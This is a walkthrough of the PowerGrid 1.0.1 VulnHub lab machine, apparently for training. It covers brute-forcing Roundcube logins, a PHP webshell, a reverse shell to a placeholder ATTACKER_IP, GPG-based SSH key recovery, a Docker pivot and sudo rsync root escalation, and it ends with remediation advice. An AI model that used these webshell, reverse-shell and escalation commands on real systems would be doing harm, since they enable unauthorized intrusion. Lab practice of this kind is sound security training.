# PowerGrid: 1.0.1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.56.x (add to /etc/hosts as `powergrid.vh`) |
| **Difficulty** | Hard |
| **OS** | Linux |
| **Goal** | 4 flags |
| **Source** | [HackingArticles](https://www.hackingarticles.in/powergrid-1-0-1-vulnhub-walkthrough/) |

## Attack Summary

PowerGrid: 1.0.1 is an advanced multi-stage machine. The path involves brute-forcing HTTP Basic Auth on a Roundcube webmail instance (Exploit-DB 40892 RCE), decrypting a PGP-protected SSH private key, pivoting into a Docker container via SSH, and escalating to root using `sudo rsync`.

## Methodology

1. Host discovery and full port scan
2. Web enumeration — three usernames discovered
3. HTTP Basic Auth brute-force with Hydra
4. Roundcube RCE (EDB-40892)
5. PHP webshell upload and reverse shell
6. Lateral movement — password reuse for user `p48`
7. GPG key decryption to recover SSH private key
8. Docker container pivot via SSH
9. Root escalation via `sudo rsync`

## Step 1: Reconnaissance

### Host Discovery

```bash
netdiscover -i eth0
# Add target to /etc/hosts
echo "192.168.56.x powergrid.vh" >> /etc/hosts
```

### Port Scan

```bash
nmap -A -p- powergrid.vh
```

![nmap](images/01-nmap.png)

The web service exposes a directory listing of usernames and runs Roundcube webmail. Note: SSH is not directly exposed on the host — it runs inside a Docker container.

## Step 2: User Enumeration

Browse to `http://powergrid.vh/`. The page lists three users:

- `deez1`
- `p48`
- `all2`

## Step 3: Web Enumeration

```bash
dirsearch -u http://powergrid.vh/ -e php,html,txt
```

![Web Enum](images/02-web-enum.png)

A directory protected by HTTP Basic Authentication is discovered (Roundcube webmail login).

## Step 4: HTTP Basic Auth Brute-Force

Brute-force each discovered username against the protected directory:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt powergrid.vh http-get /PATH_TO_ROUNDCUBE/
```

Valid credentials found. Log in to Roundcube.

## Step 5: Roundcube RCE — EDB-40892

The Roundcube version is vulnerable to authenticated RCE (Exploit-DB 40892). Confirm by creating a proof-of-concept PHP info file, then upload a PHP webshell:

```bash
# Webshell content
echo '<?php passthru($_GET["cmd"]); ?>' > shell.php

# Verify upload and execution
curl "http://powergrid.vh/PATH/shell.php?cmd=id"
```

![Roundcube RCE](images/03-roundcube-rce.png)

## Step 6: Reverse Shell

```bash
# Listener
nc -lvp 4444

# URL-encoded reverse shell payload via cmd parameter
curl "http://powergrid.vh/PATH/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

Stabilize the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

Check for flags:

```bash
find / -name "flag*" 2>/dev/null
# Flag 1 found
```

## Step 7: Lateral Movement to p48

Check the inbox email. It contains a PGP-encrypted message. The same password used for webmail is reused as the PGP passphrase:

```bash
# List home directories
ls /home/

# Switch to p48 using the webmail password
su p48
```

The GPG private key is in `p48`'s home directory. Decrypt the PGP email to retrieve an SSH private key:

```bash
gpg --import /home/p48/.gnupg/private-key.asc
gpg --decrypt pgp_message.asc
# Enter the passphrase (same as webmail password)
# Output: SSH private key
```

Save the decrypted SSH key:

```bash
echo "-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----" > /tmp/id_rsa_docker
chmod 600 /tmp/id_rsa_docker
```

## Step 8: Docker Container Pivot

Discover the Docker network:

```bash
ip route
# Note the Docker bridge network (e.g., 172.17.0.0/16)

# Scan for SSH on the Docker network
for i in $(seq 1 254); do (ping -c1 172.17.0.$i &>/dev/null && echo "172.17.0.$i up") & done
```

![Docker Pivot](images/04-docker-pivot.png)

Connect to the Docker container via SSH:

```bash
ssh -i /tmp/id_rsa_docker user@172.17.0.x
```

Find Flag 2 and read hint 2 inside the container.

## Step 9: Privilege Escalation — sudo rsync

Inside the container, check sudo permissions:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/rsync
```

Escalate using the GTFOBins `rsync` technique:

```bash
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

Root shell obtained. Read Flag 3 and Flag 4:

```bash
cat /root/flag3.txt
cat /root/flag4.txt
```

![Root Flag](images/05-root-flag.png)

## Lessons Learned

- Roundcube webmail can be a vector for authenticated RCE — keep it patched.
- Password reuse across services (webmail, GPG, SSH) leads to full chain compromise.
- Docker containers sharing network with the host extend the attack surface.
- `sudo rsync` without a password is trivially exploitable via GTFOBins.

## Remediation

| Vulnerability | Fix |
|---|---|
| HTTP Basic Auth brute-force | Enforce account lockout; use strong unique credentials |
| Roundcube RCE (EDB-40892) | Update Roundcube to a patched version |
| Password reuse | Use a unique, strong password for each service |
| Docker container network exposure | Isolate Docker networks; do not expose container SSH to host |
| `sudo rsync` NOPASSWD | Remove the sudo rule; use least-privilege for service accounts |
